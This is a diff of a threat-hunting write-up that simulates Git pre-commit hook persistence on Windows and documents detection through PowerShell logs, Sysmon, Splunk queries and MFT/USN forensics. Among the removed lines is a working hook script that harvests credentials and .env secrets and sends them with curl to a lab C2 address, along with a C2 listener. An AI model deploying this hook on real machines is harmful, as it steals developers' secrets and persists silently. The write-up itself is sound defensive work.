@@ -40,107 +40,24 @@ The attack was simulated manually as no Atomic Red Team test exists for this tec
 
 **Step 1 — Attacker setup**
 
+Note: Setup.ps1 contents are included in the file directory, as well as hosted here - https://gist.githubusercontent.com/ADZYYYY/d8dcb369797a119abbfba8880c0ebd70/raw/db44a34669ed92f91dfe0b0e28696771007522e3/gistfile1.txt
+
 A malicious PowerShell script (`setup.ps1`) was hosted on a GitHub Gist. This script:
 - Creates `C:\ProgramData\.git-hooks\` as a centrally controlled hooks directory outside of any individual repository
 - Writes a malicious `pre-commit` hook file to that directory containing logic to collect system information, scan for credential files on the victim's Desktop, Documents and Downloads, extract matching content, and exfiltrate everything via HTTP POST to the attacker's C2
 - Sets `core.hooksPath` in the victim's global Git config to point to the attacker-controlled directory, ensuring the hook fires silently on every future commit across all of the victim's repositories
-- Prints `Assessment complete.` and exits, the victim sees nothing suspicious and the script never touches disk.
+- Prints `Assessment complete.` and exits, the victim sees nothing suspicious and the script runs entirely in memory,it never writes itself to disk. However its actions create persistent files, the pre-commit hook and gitconfig modification
 
-**Setup.ps1 Script**
-```
-$hookDir = "C:\ProgramData\.git-hooks"
-New-Item -ItemType Directory -Path $hookDir -Force | Out-Null
-
-$hook = @'
-#!/bin/sh
-
-# ── System Info ──────────────────────────────
-HOST=$(hostname)
-USER=$(whoami)
-REPO=$(git rev-parse --show-toplevel 2>/dev/null)
-BRANCH=$(git branch --show-current 2>/dev/null)
-GIT_USER=$(git config user.email 2>/dev/null)
-
-# ── Credential File Search ───────────────────
-CRED_FILES=$(grep -rli \
-  -E "password|api_key|secret|token|aws_access|DB_PASSWORD|STRIPE|GITHUB_TOKEN" \
-  "$USERPROFILE/Desktop" \
-  "$USERPROFILE/Documents" \
-  "$USERPROFILE/Downloads" \
-  2>/dev/null | head -10)
-
-# ── Pull Content from Found Files ────────────
-CRED_CONTENT=""
-for f in $CRED_FILES; do
-  CRED_CONTENT="$CRED_CONTENT
---- $f ---
-$(grep -iE "password|api_key|secret|token|aws_access|DB_PASSWORD|STRIPE|GITHUB_TOKEN" "$f" 2>/dev/null | head -10)"
-done
-
-# ── ENV File Content ─────────────────────────
-ENV_CONTENT=$(find "$USERPROFILE" -name ".env" 2>/dev/null \
-  -exec grep -iE "password|key|secret|token" {} \; \
-  2>/dev/null | head -20)
-
-# ── Build Payload ────────────────────────────
-PAYLOAD="
-=== SYSTEM INFO ===
-host=$HOST
-user=$USER
-git_user=$GIT_USER
-repo=$REPO
-branch=$BRANCH
-
-=== CREDENTIAL FILES FOUND ===
-$CRED_CONTENT
-
-=== ENV FILE CONTENTS ===
-$ENV_CONTENT
-"
-
-
-# ── Exfil ────────────────────────────────────
-echo "$PAYLOAD" | curl -s -X POST http://192.168.37.132:8080/upload \
-  --data-binary @- 2>/dev/null
-'@
-
-[System.IO.File]::WriteAllText("$hookDir\pre-commit", $hook.Replace("`r`n","`n"))
-git config --global core.hooksPath $hookDir
-Write-Host "Assessment complete."
-```
 
 A fake C2 listener was started on Kali to receive exfiltrated data:
+
+Note: Breakdown of Code included in the c2.py file
+
 
 ```bash
 python3 c2.py
 ```
-```
-from http.server import HTTPServer, BaseHTTPRequestHandler
-from datetime import datetime
-
-class Handler(BaseHTTPRequestHandler):
-    def do_POST(self):
-        length = int(self.headers['Content-Length'])
-        data = self.rfile.read(length)
-        print(f"\n[{datetime.now()}] *** DATA RECEIVED ***")
-        print(data.decode())
-        self.send_response(200)
-        self.end_headers()
-
-    def log_message(self, format, *args):
-        pass
-
-print("[*] Fake C2 listening on 0.0.0.0:8080...")
-HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
-```
-
-- `HTTPServer('0.0.0.0', 8080)` binds to all network interfaces on port 8080, accepting connections from any machine on the network
-- `do_POST` handles incoming HTTP POST requests — this is the method the pre-commit hook uses to deliver stolen data via `curl`
-- `self.headers['Content-Length']` reads the size of the incoming data, then `self.rfile.read(length)` reads the full payload body
-- `data.decode()` converts the raw bytes to readable text and prints it to the terminal with a timestamp, displaying the exfiltrated credentials and system information
-- `self.send_response(200)` returns an HTTP 200 OK to the victim machine so `curl` exits cleanly with no errors — keeping the hook silent
-- `log_message` is overridden to suppress the default HTTP request logs, keeping the terminal output clean and showing only the received data
-- `serve_forever()` keeps the server running continuously, ready to receive data from every subsequent commit the victim makes
+![c2listener](screenshots/c2listener.png)
 
 
 
@@ -149,7 +66,7 @@ HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
 
 > **Note:** While this test describes a user being socially engineered, resulting in running a powershell command, the same persistence mechanism can be achieved through several other attack vectors that require no direct user interaction beyond normal developer activity.
 
-**Alternative Delivery — Malicious npm Package**
+**e.g Alternative Delivery — Malicious npm Package**
 
 A threat actor could publish a malicious npm package containing a `postinstall` script that plants the hook automatically when a developer runs `npm install`:
 
@@ -175,7 +92,7 @@ In all cases the end result is identical, `core.hooksPath` is set globally and t
 
 **Step 3 — Hook triggered**
 
-A Git commit was made in the victim's development project. The pre-commit hook fired silently before the commit completed. Git read the global core.hooksPath setting and executed the local script at C:\ProgramData\.git-hooks\pre-commit, which had been written to disk during the initial IEX delivery.
+A Git commit was made in the victim's development project at 2026-06-03 3:16. The pre-commit hook fired silently before the commit completed. Git read the global core.hooksPath setting and executed the local script at C:\ProgramData\.git-hooks\pre-commit, which had been written to disk during the initial IEX delivery.
 
 ![Hook Triggered](screenshots/gitcommitperformedbydev.png)
 
@@ -253,7 +170,7 @@ index=sysmon EventCode=11 earliest=-60m
 
 ![ForensicArtefacts](screenshots/obtainingforensicartefacts.png)
 
-- Using FTK Imager, I simply added my Logical file system as evidence, and navigated to root to find the MFT File, then $extend to find the USL journal. From here I have the option to create a copy, where I can later use tools such as MFTECmd.exe to parse the data.
+- Using FTK Imager, I simply added my Logical file system as evidence, and navigated to root to find the MFT File, then $extend to find the USN journal. From here I have the option to create a copy, where I can later use tools such as MFTECmd.exe to parse the data.
 
 **Parsing Data**
 
@@ -281,16 +198,18 @@ index=sysmon EventCode=11 earliest=-60m
 ![ForensicArtefacts](screenshots/mft2.png)
 ![ForensicArtefacts](screenshots/mft3.png)
 
+**Note**: All above screenshots are UTC, splunk is configured to London time which is +1 right now. 
+
 - Here we can observe exactly what we are looking for, so from the powershell events that happened at 03:09 (Splunk configured to London time), we can see directly what happened.
 
-**pre-commit file created**
+**pre-commit file created**  2026-06-03 2:09:26
 ```
 C:\ProgramData\.git-hooks\pre-commit
 ```
 - The pre-commit hook was written to `C:\ProgramData\.git-hooks\` — a location completely outside any individual Git repository
 - Legitimate Git hooks live inside `.git\hooks\` within a specific project. A pre-commit file appearing in `ProgramData` is highly suspicious and has no legitimate developer use case
 
-**gitconfig.lock created**
+**gitconfig.lock created** 2026-06-03 2:09:26
 ```
 C:\Users\Adam\AppData\Local\Programs\Git\etc\gitconfig
 ```
@@ -305,8 +224,8 @@ C:\Users\Adam\AppData\Local\Programs\Git\etc\gitconfig
 When the developer ran `git commit`, the pre-commit hook fired. Sysmon Event ID 1 captures the full process chain, showing `git.exe` spawning `sh.exe`, which then spawned `grep.exe` and `curl.exe`.
 
 ```spl
-index=sysmon EventCode=1 earliest=-60m
-| search (ParentImage="*git.exe" AND Image="*sh.exe") 
+index=sysmon EventCode=1 earliest=-24h
+| search (ParentImage="*git.exe" AND Image="*sh.exe")
     OR (ParentImage="*sh.exe" AND (Image="*grep.exe" OR Image="*find.exe" OR Image="*curl.exe"))
 | table _time host User ParentImage Image CommandLine ProcessId ParentProcessId
 | rename ParentImage as "Parent Process", Image as "Process", CommandLine as "Command Line"
@@ -319,21 +238,32 @@ index=sysmon EventCode=1 earliest=-60m
 
 **Results**
 
-![Splunk Event 1](screenshots/05-splunk-event-1-process-chain.png)
+![Splunk Event 1](screenshots/EventID1.png)
 
-The full process chain observed was:
+- Process chain observed was:
 
 ```
-git.exe
-  └── sh.exe         (executes the pre-commit hook)
+ sh.exe         (executes the pre-commit hook)
         ├── grep.exe (scans files for credential keywords)
         ├── find.exe (searches for .env files)
         └── curl.exe (exfiltrates data via HTTP POST)
 ```
 
-- `git.exe → sh.exe` is normal Git behaviour and would not alert on its own
-- `sh.exe → grep.exe` scanning `Desktop`, `Documents`, and `Downloads` is not normal — no legitimate pre-commit hook would need to search a user's home directories
+- `sh.exe → grep.exe` scanning `Desktop`, `Documents`, and `Downloads` is not normal, no legitimate pre-commit hook would need to search a user's home directories
 - `sh.exe → curl.exe` making an outbound `POST` request to a non-developer IP is the strongest signal of exfiltration
+- `sh.exe → find.exe` (searches for .env files)
+
+**Key Note:**
+
+The sh.exe creation event itself was not captured by Sysmon Event ID 1, 
+despite ProcessCreate having ruledefault="include" and sh.exe not being 
+present in the exclude rules. This suggests Git's internal hook execution 
+mechanism on Windows spawns sh.exe in a way that does not surface as a 
+standard process creation event. The evidence that sh.exe was running is 
+confirmed indirectly — grep.exe and curl.exe both show ParentImage=sh.exe, 
+proving it was the executing shell, even though its own creation was not logged. If anyone has a deeper explanation for this, please let me know.
+
+
 
 
 ### Event ID 3 — Network Connection (Data Exfiltration)
@@ -341,39 +271,49 @@ git.exe
 Sysmon Event ID 3 captures outbound network connections. The key signal here is `curl.exe` making a `POST` request with `sh.exe` as the parent process.
 
 ```spl
-index=sysmon EventCode=3 earliest=-60m
-| search (Image="*curl.exe" OR Image="*sh.exe") 
-| search ParentImage="*sh.exe" OR ParentImage="*git.exe"
-| table _time host User Image ParentImage DestinationIp DestinationPort SourceIp Protocol
-| rename Image as "Process", ParentImage as "Parent Process", DestinationIp as "Destination IP", DestinationPort as "Destination Port"
+index=sysmon EventCode=3 earliest=-24h
+| search Image="*curl.exe" OR DestinationPort=8080
+| table _time host User Image DestinationIp DestinationPort SourceIp Protocol
 | sort _time
 ```
 
-- `Image="*curl.exe"` identifies the process making the outbound connection
-- `ParentImage="*sh.exe"` confirms it was spawned by the hook shell, not by a user directly
-- `DestinationIp` and `DestinationPort` show where the data was sent — in this test, `192.168.37.132:8080`
-
 **Results**
 
-![Splunk Event 3](screenshots/06-splunk-event-3-network.png)
+![Splunk Event 1](screenshots/eventid3.png)
 
-- `curl.exe` was observed making an outbound HTTP POST to `192.168.37.132:8080`, with `sh.exe` as the parent process and `git.exe` as the grandparent
-- In a real attack, this destination would be an internet-facing C2 server, potentially hosted on a trusted platform such as a cloud provider or a legitimate-looking domain to blend into normal developer traffic
+Sysmon Event ID 3 captured an outbound TCP connection to `192.168.37.132:8080` 
+at `2026-06-03 03:16:56`, confirming the exfiltration occurred. However the 
+process name resolved as `<unknown process>` rather than `curl.exe`. This is 
+a known Sysmon behaviour — when a process terminates very quickly, Sysmon cannot 
+resolve the process name by the time it logs the network event. `curl.exe` with 
+the `-s` flag executes a single POST request and exits almost immediately, which 
+is fast enough to cause this resolution failure.
+
+Despite the missing process name, the evidence is still significant, the 
+destination IP `192.168.37.132` and port `8080` directly match the attacker's 
+C2 listener, and the timestamp `03:16:56` is consistent with the hook execution 
+observed two seconds earlier in Event ID 1 at `03:16:53`. This correlation 
+between the process chain and the network connection confirms the full 
+exfiltration chain even without the process name being resolved.
+
+
 
 
 ## Findings
 
-PowerShell Event ID 4104 was the earliest and loudest detection point, capturing the full IEX delivery script in memory before anything was written to disk. This is consistent with findings from H001.
+## Findings
 
-Sysmon Event ID 11 confirmed the persistence mechanism by showing the pre-commit hook being written to `C:\ProgramData\.git-hooks\` and the global gitconfig being modified — both are strong indicators because neither has a legitimate use in normal developer workflows.
+PowerShell Event ID 4104 was the earliest and loudest detection point, capturing the full IEX delivery script in memory before anything was written to disk. This is consistent with findings from H001 — fileless delivery via IEX does not evade Script Block Logging, as the PowerShell engine logs what it executes regardless of how the script was delivered.
 
-Sysmon Event ID 1 revealed the full execution chain when the hook fired, showing `git.exe → sh.exe → grep.exe → curl.exe`. The file scanning and outbound connection activity from a shell spawned by Git is anomalous and would not occur during normal developer activity.
+Sysmon Event ID 11 returned no results for the hook file creation or gitconfig modification. This is a detection gap caused by the default Sysmon configuration using `ruledefault="exclude"` for FileCreate events — `C:\ProgramData\` and gitconfig paths were not included in the monitoring rules. The persistence was instead confirmed through MFT and USN journal forensic artefacts, which captured the creation of `C:\ProgramData\.git-hooks\pre-commit` and the atomic write pattern of the gitconfig modification. This highlights the value of collecting raw filesystem artefacts alongside endpoint telemetry during incident response, Sysmon alone was insufficient to confirm persistence establishment with this configuration.
 
-Sysmon Event ID 3 confirmed data exfiltration via an outbound HTTP POST from `curl.exe` parented to `sh.exe` and `git.exe`.
+Sysmon Event ID 1 captured partial evidence of the hook execution chain. The `sh.exe → grep.exe` and `sh.exe → curl.exe` process creations were observed, confirming the hook actively scanned credential files and attempted exfiltration. However the `sh.exe` creation event itself was not captured despite `ProcessCreate` having `ruledefault="include"` and `sh.exe` not being present in the exclude rules. This appears to be related to Git's internal hook execution mechanism on Windows, which may spawn `sh.exe` in a way that does not surface as a standard process creation event. The `git.exe → sh.exe` relationship therefore could not be proven through Sysmon alone, though `sh.exe` running as the parent of `grep.exe` and `curl.exe` is independently anomalous.
 
-For this hunt, PowerShell Event ID `4104` caught the delivery, Sysmon Event ID `11` caught the persistence being established, Sysmon Event ID `1` caught the hook executing and scanning for credentials, and Sysmon Event ID `3` caught the exfiltration. Together they provide full coverage across the attack chain.
+Sysmon Event ID 3 captured an outbound TCP connection to `192.168.37.132:8080` consistent with the exfiltration, however the process name resolved as `<unknown process>` (https://learn.microsoft.com/en-us/answers/questions/417625/process-information-missing-from-network-connectio) rather than `curl.exe`. This is apparently a known Sysmon behaviour when a process terminates faster than the event can be resolved — `curl.exe` with the `-s` flag completes a single POST and exits almost immediately. Despite this, the destination IP and port directly match the attacker's C2 listener, and the timestamp at `03:16:56` is consistent with the hook execution observed two seconds earlier in Event ID 1 at `03:16:53`, providing sufficient correlation to confirm the exfiltration.
 
-> **Key observation:** Windows Defender did not flag this activity. The technique relies entirely on legitimate binaries — `git.exe`, `sh.exe`, `grep.exe`, `curl.exe` — with no malicious executables dropped. Detection depends on behavioural monitoring via Sysmon, not signature-based AV.
+For this hunt, PowerShell Event ID `4104` caught the delivery, the MFT and USN journal confirmed the persistence being established on disk, Sysmon Event ID `1` caught the hook executing and scanning for credentials, and Sysmon Event ID `3` caught the outbound exfiltration connection. Together they provide coverage across the full attack chain, though multiple detection gaps in the default Sysmon configuration were identified, particularly around FileCreate monitoring and process chain resolution for shortlived processes.
+
+> **Key observation:** Windows Defender did not flag this activity. The technique relies entirely on legitimate binaries — `git.exe`, `sh.exe`, `grep.exe`, `curl.exe` — with no malicious executables dropped. Detection depends on behavioural monitoring via Sysmon and forensic artefact collection, not signature-based AV.
 
 
 ## Removal
